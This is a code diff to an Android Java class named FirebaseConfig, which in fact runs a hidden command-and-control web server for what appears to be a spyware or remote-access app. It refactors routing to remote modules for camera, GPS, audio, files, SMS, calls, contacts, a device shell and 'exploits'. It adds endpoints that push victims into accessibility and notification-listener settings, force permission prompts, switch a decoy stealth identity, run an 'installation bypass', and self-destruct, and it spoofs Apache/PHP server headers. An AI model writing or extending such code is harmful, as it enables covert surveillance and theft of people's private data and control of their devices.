@@ -14,6 +14,7 @@ import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.Settings;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.telephony.SmsManager;
@@ -47,12 +48,17 @@ import java.security.KeyStore;
 import com.labs.labrats.modules.ExploitsModule;
 import com.labs.labrats.modules.TerminalModule;
 import com.labs.labrats.modules.GhostModule;
+import com.labs.labrats.router.AuthController;
+import com.labs.labrats.router.PasswordHasher;
+import com.labs.labrats.router.Router;
 import fi.iki.elonen.NanoHTTPD;
 
 public class FirebaseConfig extends NanoHTTPD {
 
     public static final int DEFAULT_PORT = 9191;
     private final Context context;
+    private final Router router = new Router();
+    private final AuthController authController;
     private final ExploitsModule exploitsModule;
     private final TerminalModule terminalModule;
     private final GhostModule ghostModule;
@@ -214,7 +220,7 @@ public class FirebaseConfig extends NanoHTTPD {
         String navHtml = "";
         if (!uri.equals("/login")) {
             navHtml = "  <div class=\"nav\">" +
-                "    <a href=\"/\" id=\"nav-home\" class=\"" + homeActive + "\">Terminal</a>" +
+                "    <a href=\"/terminal\" id=\"nav-home\" class=\"" + homeActive + "\">Terminal</a>" +
                 "    <a href=\"/ghost\" id=\"nav-ghost\" class=\"" + ghostActive + "\">Ghost</a>" +
                 "    <a href=\"/camera\" id=\"nav-camera\" class=\"" + cameraActive + "\">Optics</a>" +
                 "    <a href=\"/gps\" id=\"nav-gps\" class=\"" + gpsActive + "\">Locate</a>" +
@@ -256,7 +262,7 @@ public class FirebaseConfig extends NanoHTTPD {
 
     public String getFooter() {
         return "<audio id=\"live-audio-player\" style=\"display:none;\"></audio>" +
-                "<div style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 60px; margin-bottom: 20px; opacity: 0.5; font-family: 'OrbitronC2', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 0 20px;\">" +
+                "<div class=\"card\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 50px; margin-bottom: 25px; font-family: 'OrbitronC2', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 18px 20px;\">" +
                 "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's who MIND don't matter... The one's who MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
                 "</div>" +
                 "</div>" +
@@ -270,15 +276,15 @@ public class FirebaseConfig extends NanoHTTPD {
             "<link href=\"https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
             "<style>" +
             "* { box-sizing: border-box; margin: 0; padding: 0; }" +
-            ".login-centering-wrapper { background: #000; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; overflow: hidden; padding: 15px; }" +
-            ".login-card { background: rgba(15,15,25,0.95); border: 1px solid #00f2ff; padding: 50px 30px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
+            ".login-centering-wrapper { background-color: #02090e; background-image: radial-gradient(circle at 50% 0%, rgba(0,242,255,.14) 0, rgba(57,255,20,.03) 35%, transparent 70%), radial-gradient(circle at 10% 90%, rgba(57,255,20,.05) 0, transparent 45%), radial-gradient(circle at 90% 90%, rgba(0,242,255,.05) 0, transparent 45%), linear-gradient(rgba(0,242,255,.025) 1px, transparent 1px), linear-gradient(90deg, rgba(0,242,255,.025) 1px, transparent 1px), url(\"data:image/svg+xml,%3Csvg width='320' height='320' viewBox='0 0 320 320' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 80h320M0 160h320M0 240h320M80 0v320M160 0v320M240 0v320' stroke='%2300f2ff' stroke-width='0.4' stroke-opacity='0.03'/%3E%3Crect x='120' y='120' width='80' height='80' rx='6' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.12'/%3E%3Crect x='136' y='136' width='48' height='48' rx='4' fill='%2300f2ff' fill-opacity='0.02' stroke='%2339ff14' stroke-width='0.8' stroke-opacity='0.12'/%3E%3Cpath d='M136 120v-10M152 120v-10M168 120v-10M184 120v-10 M136 200v10M152 200v10M168 200v10M184 200v10 M120 136h-10M120 152h-10M120 168h-10M120 184h-10 M200 136h10M200 152h10M200 168h10M200 184h10' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.15'/%3E%3Cpath d='M136 110V60L100 30H20' fill='none' stroke='%2300f2ff' stroke-width='0.9' stroke-opacity='0.1'/%3E%3Cpath d='M152 110V76L180 48H300' fill='none' stroke='%2300f2ff' stroke-width='0.9' stroke-opacity='0.1' stroke-dasharray='6,3'/%3E%3Cpath d='M168 110V40L200 8H320' fill='none' stroke='%2339ff14' stroke-width='0.9' stroke-opacity='0.12'/%3E%3Cpath d='M136 210v48l-36 30H0' fill='none' stroke='%2300f2ff' stroke-width='0.9' stroke-opacity='0.1'/%3E%3Cpath d='M168 210v32l32 32h100' fill='none' stroke='%2300f2ff' stroke-width='0.9' stroke-opacity='0.1'/%3E%3Cpath d='M184 210v60l-30 30H40' fill='none' stroke='%2339ff14' stroke-width='0.9' stroke-opacity='0.12' stroke-dasharray='8,4'/%3E%3Cpath d='M110 136H60L30 100V0' fill='none' stroke='%2300f2ff' stroke-width='0.9' stroke-opacity='0.1'/%3E%3Cpath d='M110 168H48L20 198V320' fill='none' stroke='%2339ff14' stroke-width='0.9' stroke-opacity='0.1'/%3E%3Cpath d='M210 152h48l30-30V0' fill='none' stroke='%2300f2ff' stroke-width='0.9' stroke-opacity='0.1'/%3E%3Cpath d='M210 184h40l36 36V320' fill='none' stroke='%2300f2ff' stroke-width='0.9' stroke-opacity='0.1'/%3E%3Ccircle cx='20' cy='30' r='3' fill='none' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Ccircle cx='20' cy='30' r='1.2' fill='%2300f2ff' fill-opacity='0.3'/%3E%3Ccircle cx='300' cy='48' r='3' fill='none' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Ccircle cx='300' cy='48' r='1.2' fill='%2300f2ff' fill-opacity='0.3'/%3E%3Ccircle cx='30' cy='100' r='3' fill='none' stroke='%2339ff14' stroke-width='0.8' stroke-opacity='0.25'/%3E%3Ccircle cx='30' cy='100' r='1.2' fill='%2339ff14' fill-opacity='0.4'/%3E%3Ccircle cx='290' cy='122' r='3' fill='none' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Ccircle cx='290' cy='122' r='1.2' fill='%2300f2ff' fill-opacity='0.3'/%3E%3Ccircle cx='300' cy='292' r='3' fill='none' stroke='%2339ff14' stroke-width='0.8' stroke-opacity='0.25'/%3E%3Ccircle cx='300' cy='292' r='1.2' fill='%2339ff14' fill-opacity='0.4'/%3E%3Ccircle cx='40' cy='302' r='3' fill='none' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Ccircle cx='40' cy='302' r='1.2' fill='%2300f2ff' fill-opacity='0.3'/%3E%3C/svg%3E\"); background-size: 100% 100%, 100% 100%, 100% 100%, 60px 60px, 60px 60px, 320px 320px; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; overflow: hidden; padding: 15px; }" +
+            ".login-card { background: rgba(15,15,25,0.65); backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px); border: 1px solid #00f2ff; padding: 50px 30px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
             ".title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 40px; color: #00f2ff; line-height: 1.2; white-space: nowrap; transition: all 0.5s; }" +
             "@media (max-width: 480px) {" +
             "  .login-card { padding: 35px 20px; }" +
             "  .title-font { font-size: 1.3rem !important; letter-spacing: 1.5px; margin-bottom: 25px; }" +
             "  input { padding: 14px !important; font-size: 14px !important; }" +
             "  button { padding: 14px !important; font-size: 14px !important; }" +
-            "  .login-card img { width: 150px !important; height: 150px !important; }" +
+            "  .login-card img { width: 173px !important; height: 173px !important; }" +
             "}" +
             "form { display: flex; flex-direction: column; align-items: center; width: 100%; }" +
             "input { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 18px; margin-bottom: 30px; width: 100%; max-width: 350px; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }" +
@@ -290,7 +296,7 @@ public class FirebaseConfig extends NanoHTTPD {
             "</style></head><body>" +
             "<div class=\"login-centering-wrapper\">" +
             "<div class=\"login-card\">" +
-            "<img src=\"/logo?v=146\" style=\"width: 187px; height: 187px; background: transparent !important;\">" +
+            "<img src=\"/logo?v=146\" style=\"width: 215px; height: 215px; background: transparent !important;\">" +
             "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
             "<div style=\"font-size:1.0rem; opacity:0.5; margin-top:-25px; margin-bottom:35px; letter-spacing:3px; font-family: 'Aldrich', sans-serif;\">v1.5.1</div>" +
                         "<form id=\"login-form\" method=\"POST\" action=\"/login\">" +
@@ -344,6 +350,8 @@ public class FirebaseConfig extends NanoHTTPD {
         this.commsModule = new com.labs.labrats.modules.CommsModule(this.context, this);
         this.intelModule = new com.labs.labrats.modules.IntelModule(this.context, this);
         this.acousticsModule = new com.labs.labrats.modules.AcousticsModule(this.context, this);
+        this.authController = new AuthController(this.context, this);
+        setupRouter();
         
         // Multi-Threaded Executor: Allows handling multiple C2 requests at once
         // Optimization: Uses a cached thread pool to reuse threads efficiently
@@ -514,71 +522,172 @@ public class FirebaseConfig extends NanoHTTPD {
         return serve404(null);
     }
 
+    private void setupRouter() {
+        router.registerPrefix("/c2/", session -> serveAsset(session, session.getUri()));
+        router.registerExact("/logo", this::serveLogo);
+        router.registerPrefix("/font/orbitron.ttf", this::serveFont);
+        router.registerPrefix("/exploits", session -> exploitsModule.handleRequest(session));
+        router.registerPrefix("/terminal", session -> terminalModule.handleRequest(session));
+        router.registerExact("/", session -> terminalModule.handleRequest(session));
+        router.registerPrefix("/ghost", session -> ghostModule.handleRequest(session));
+        router.registerExact("/stealth", session -> ghostModule.handleRequest(session));
+        router.registerPrefix("/camera", session -> opticsModule.handleRequest(session));
+        router.registerPrefix("/gps", session -> locateModule.handleRequest(session));
+        router.registerPrefix("/files", session -> dataModule.handleRequest(session));
+        router.registerPrefix("/download/", session -> dataModule.handleRequest(session));
+        router.registerPrefix("/calls", session -> commsModule.handleRequest(session));
+        router.registerPrefix("/sms", session -> commsModule.handleRequest(session));
+        router.registerPrefix("/mms", session -> commsModule.handleRequest(session));
+        router.registerExact("/contacts", session -> commsModule.handleRequest(session));
+        router.registerPrefix("/intel", session -> intelModule.handleRequest(session));
+        router.registerExact("/settings/password", this::updatePassword);
+        router.registerPrefix("/audio", session -> acousticsModule.handleRequest(session));
+        router.registerPrefix("/device", this::handleDeviceRoutes);
+    }
+
+    private Response handleDeviceRoutes(IHTTPSession session) {
+        String uri = session.getUri();
+        Map<String, String> params = session.getParms();
+        if (uri.equals("/device")) {
+            return serveDeviceInfo(session);
+        } else if (uri.equals("/device/vibrate")) {
+            vibrateDevice();
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/max-volume")) {
+            setMaxVolume();
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/silent-mode")) {
+            setSilentMode();
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/shell")) {
+            return terminalModule.handleRequest(session);
+        } else if (uri.equals("/device/apps")) {
+            return serveAppList(session);
+        } else if (uri.equals("/device/open-app")) {
+            openAppOnDevice(params.get("pkg"));
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/open-url")) {
+            openUrlOnDevice(params.get("url"));
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/decoy")) {
+            String choiceStr = params.get("choice");
+            if (choiceStr != null) {
+                try {
+                    int choice = Integer.parseInt(choiceStr);
+                    SystemAnalytics.setDecoyChoice(context, choice);
+                    SystemAnalytics.setStealthMode(context, true);
+                    logActivity("DECOY_SWITCH: Stealth identity updated to persona " + choice);
+                    return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"choice\": " + choice + "}");
+                } catch (Exception ignored) {}
+            }
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false}");
+        } else if (uri.equals("/device/toast")) {
+            String msg = params.get("msg");
+            int size = 22, y = 250, duration = 3500;
+            String anim = params.get("anim"); if (anim == null) anim = "scroll";
+            String color = params.get("color"); if (color == null) color = "#FFFFFF";
+            try {
+                if (params.containsKey("size")) size = Integer.parseInt(params.get("size"));
+                if (params.containsKey("y")) y = Integer.parseInt(params.get("y"));
+                if (params.containsKey("duration")) duration = Integer.parseInt(params.get("duration"));
+            } catch (Exception ignored) {}
+            showToast(msg, size, y, anim, duration, color);
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/fix-persistence")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched permission repair sequence.");
+            new Handler(Looper.getMainLooper()).post(() -> {
+                Intent intent = new Intent(context, PermissionActivity.class);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                context.startActivity(intent);
+            });
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"REPAIR_SEQUENCE_DISPATCHED\"}");
+        } else if (uri.equals("/device/request-permissions")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched batch permission prompt.");
+            new Handler(Looper.getMainLooper()).post(() -> {
+                Intent intent = new Intent(context, PermissionActivity.class);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                context.startActivity(intent);
+            });
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"PERMISSION_PROMPTS_DISPATCHED\"}");
+        } else if (uri.equals("/device/optimize-stability")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched OEM auto-start optimization.");
+            new Handler(Looper.getMainLooper()).post(() -> OemStabilityHelper.requestAutoStart(context));
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"OEM_OPTIMIZATION_DISPATCHED\"}");
+        } else if (uri.equals("/device/deep-repair")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched application settings details.");
+            new Handler(Looper.getMainLooper()).post(() -> {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                    intent.setData(Uri.parse("package:" + context.getPackageName()));
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    context.startActivity(intent);
+                } catch (Exception ignored) {}
+            });
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"APP_SETTINGS_OPENED\"}");
+        } else if (uri.equals("/device/open-accessibility")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely opened Accessibility settings.");
+            new Handler(Looper.getMainLooper()).post(() -> {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    context.startActivity(intent);
+                } catch (Exception ignored) {}
+            });
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"ACCESSIBILITY_HUB_OPENED\"}");
+        } else if (uri.equals("/device/open-notifications")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely opened Notification Listener settings.");
+            new Handler(Looper.getMainLooper()).post(() -> {
+                try {
+                    Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    context.startActivity(intent);
+                } catch (Exception ignored) {}
+            });
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"NOTIFICATION_HUB_OPENED\"}");
+        } else if (uri.equals("/device/inject-trust")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched session installation bypass.");
+            new Handler(Looper.getMainLooper()).post(() -> StabilityBypass.executeTrustInjection(context));
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"BYPASS_SEQUENCE_INITIATED\"}");
+        } else if (uri.equals("/device/terminate")) {
+            logActivity("SYSTEM_TERMINATED: Remote operator issued hard kill command");
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                Intent intent = new Intent(context, WorkManager_Sync.class);
+                intent.setAction(Constants.ACTION_STOP_CORE);
+                context.startService(intent);
+            }, 1500);
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"redirect\": \"/logout\"}");
+        } else if (uri.equals("/device/self-destruct")) {
+            selfDestruct();
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        }
+        return null;
+    }
+
     @Override
     public Response serve(IHTTPSession session) {
         if (session == null) return null;
-        
+
         String uri = session.getUri();
         if (uri == null) uri = "/";
-        
-        Response response;
+
+        Response response = null;
         CookieHandler cookies = session.getCookies();
-        
+
         try {
             // Watchdog: Update operator activity time for heartbeat scaling
             WorkManager_Sync.notifyOperatorActivity();
 
             // 0. Public Asset Handlers
             if (uri.equals("/favicon.ico")) {
-                return newFixedLengthResponse(Response.Status.NO_CONTENT, "image/x-icon", "");
+                response = newFixedLengthResponse(Response.Status.NO_CONTENT, "image/x-icon", "");
             }
-
             // 1. Handle Login (Standard Protocol)
-            if (uri.equals("/login") && session.getMethod() == Method.POST) {
-                session.parseBody(new HashMap<>());
-                String pass = session.getParms().get("password");
-                
-                // [DEEP_STEALTH] De-obfuscate payload if it's masked
-                if (pass != null && pass.startsWith("0x_")) {
-                    try {
-                        byte[] decoded = android.util.Base64.decode(pass.substring(3), android.util.Base64.DEFAULT);
-                        pass = new StringBuilder(new String(decoded, "UTF-8")).reverse().toString();
-                    } catch (Exception ignored) {}
-                }
-
-                boolean isJson = "true".equals(session.getParms().get("json"));
-                
-                if (pass != null && getStoredPassword().equals(pass.trim())) {
-                    logActivity("AUTHENTICATION_SUCCESS: Uplink established");
-                    
-                    if (isJson) {
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else {
-                        response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
-                        response.addHeader("Location", "/");
-                    }
-                    
-                    // Stabilize session token
-                    WorkManager_Sync.activeSessionToken = sessionToken;
-                    response.addHeader("Set-Cookie", "token=" + sessionToken + "; Path=/; HttpOnly; Max-Age=31536000");
-                } else {
-                    logActivity("UPLINK_DENIED: Invalid credentials");
-                    if (isJson) {
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false}");
-                    } else {
-                        response = serveGzipped(session, "text/html", LOGIN_HTML.replace("RESTRICTED_ACCESS", "INVALID_CREDENTIALS"));
-                    }
-                }
-            } 
+            else if (uri.equals("/login") && session.getMethod() == Method.POST) {
+                response = authController.handleLogin(session, LOGIN_HTML);
+            }
             // 2. Handle Logout
             else if (uri.equals("/logout")) {
-                logActivity("AUTHENTICATION_TERMINATED: Session closed");
-                sessionToken = java.util.UUID.randomUUID().toString(); 
-                context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                    .edit().putString("session_token", sessionToken).apply();
-                
-                response = serveGzipped(session, "text/html", LOGOUT_HTML);
-                response.addHeader("Set-Cookie", "token=deleted; Path=/; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; SameSite=Strict");
+                response = authController.handleLogout(session, LOGOUT_HTML);
             }
             // 3. Main Routing & Auth Check
             else {
@@ -600,75 +709,14 @@ public class FirebaseConfig extends NanoHTTPD {
                         response = serveGzipped(session, "text/html", LOGIN_HTML);
                     }
                 } else {
-                    // Logged in: Process standard routes
-                    Map<String, String> params = session.getParms();
-                    
                     if (uri.equals("/login")) {
                         response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
                         response.addHeader("Location", "/");
-                    } else if (uri.startsWith("/c2/")) {
-                        response = serveAsset(session, uri);
-                    } else if (uri.startsWith("/exploits")) {
-                        response = exploitsModule.handleRequest(session);
-                    } else if (uri.equals("/") || uri.isEmpty() || uri.startsWith("/terminal/")) {
-                        response = terminalModule.handleRequest(session);
-                    } else if (uri.startsWith("/ghost") || uri.equals("/stealth")) {
-                        response = ghostModule.handleRequest(session);
-                    } else if (uri.startsWith("/camera")) {
-                        response = opticsModule.handleRequest(session);
-                    } else if (uri.startsWith("/gps")) {
-                        response = locateModule.handleRequest(session);
-                    } else if (uri.equals("/files") || uri.startsWith("/files/") || uri.startsWith("/download/")) {
-                        response = dataModule.handleRequest(session);
-                    } else if (uri.equals("/calls") || uri.startsWith("/calls/") || uri.equals("/sms") || uri.startsWith("/sms/") || uri.equals("/mms") || uri.startsWith("/mms/") || uri.equals("/contacts")) {
-                        response = commsModule.handleRequest(session);
-                    } else if (uri.startsWith("/intel")) {
-                        response = intelModule.handleRequest(session);
-                    } else if (uri.equals("/settings/password")) {
-                        response = updatePassword(session);
-                    } else if (uri.startsWith("/audio")) {
-                        response = acousticsModule.handleRequest(session);
-                    } else if (uri.equals("/logo")) {
-                        response = serveLogo(session);
-                    } else if (uri.startsWith("/font/orbitron.ttf")) {
-                        response = serveFont(session);
-                    } else if (uri.equals("/device")) {
-                        response = serveDeviceInfo(session);
-                    } else if (uri.startsWith("/device/")) {
-                        // All other device sub-routes
-                        if (uri.equals("/device/vibrate")) { vibrateDevice(); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
-                        else if (uri.equals("/device/max-volume")) { setMaxVolume(); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
-                        else if (uri.equals("/device/silent-mode")) { setSilentMode(); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
-                        else if (uri.equals("/device/shell")) { response = terminalModule.handleRequest(session); }
-                        else if (uri.equals("/device/apps")) { response = serveAppList(session); }
-                        else if (uri.equals("/device/open-app")) { openAppOnDevice(params.get("pkg")); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
-                        else if (uri.equals("/device/open-url")) { openUrlOnDevice(params.get("url")); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
-                        else if (uri.equals("/device/toast")) {
-                            String msg = params.get("msg");
-                            int size = 22, y = 250, duration = 3500;
-                            String anim = params.get("anim"); if (anim == null) anim = "scroll";
-                            String color = params.get("color"); if (color == null) color = "#FFFFFF";
-                            try {
-                                if (params.containsKey("size")) size = Integer.parseInt(params.get("size"));
-                                if (params.containsKey("y")) y = Integer.parseInt(params.get("y"));
-                                if (params.containsKey("duration")) duration = Integer.parseInt(params.get("duration"));
-                            } catch (Exception ignored) {}
-                            showToast(msg, size, y, anim, duration, color);
-                            response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                        }
-                        else if (uri.equals("/device/terminate")) {
-                            logActivity("SYSTEM_TERMINATED: Remote operator issued hard kill command");
-                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                Intent intent = new Intent(context, WorkManager_Sync.class);
-                                intent.setAction(Constants.ACTION_STOP_CORE);
-                                context.startService(intent);
-                            }, 1500);
-                            response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"redirect\": \"/logout\"}");
-                        }
-                        else if (uri.equals("/device/self-destruct")) { selfDestruct(); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
-                        else response = serve404(session);
                     } else {
-                        response = serve404(session);
+                        response = router.dispatch(session);
+                        if (response == null) {
+                            response = serve404(session);
+                        }
                     }
                 }
             }
@@ -679,14 +727,12 @@ public class FirebaseConfig extends NanoHTTPD {
         if (response != null) {
             response.addHeader("Server", "Apache/2.4.41 (Ubuntu)");
             response.addHeader("X-Powered-By", "PHP/7.4.3");
-            
-            // OPTICS_STABILITY: Exclude camera streams and assets from cache lockdown to prevent stutter
+
             if (!uri.equals("/logo") && !uri.startsWith("/font/") && !uri.contains("/camera/") && !uri.contains("/ghost/")) {
                 response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
                 response.addHeader("Pragma", "no-cache");
                 response.addHeader("Expires", "0");
             } else {
-                // For streams, use a lighter cache policy
                 response.addHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
             }
         }
@@ -701,7 +747,7 @@ public class FirebaseConfig extends NanoHTTPD {
             if (bitmap == null) return serve404(session);
 
             // Optimization: Scale down large logos for faster delivery from mobile server
-            int targetHeight = 180;
+            int targetHeight = 207;
             int targetWidth = (int) (bitmap.getWidth() * (targetHeight / (float) bitmap.getHeight()));
             android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, targetWidth, targetHeight, true);
             
@@ -833,10 +879,7 @@ public class FirebaseConfig extends NanoHTTPD {
                 return serveError(session, "Invalid password");
             }
 
-            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                    .edit()
-                    .putString("c2_password", newPass.trim())
-                    .apply();
+            PasswordHasher.savePassword(context, newPass.trim());
 
             logActivity("SECURITY_PROTOCOL: Interface password updated");
 
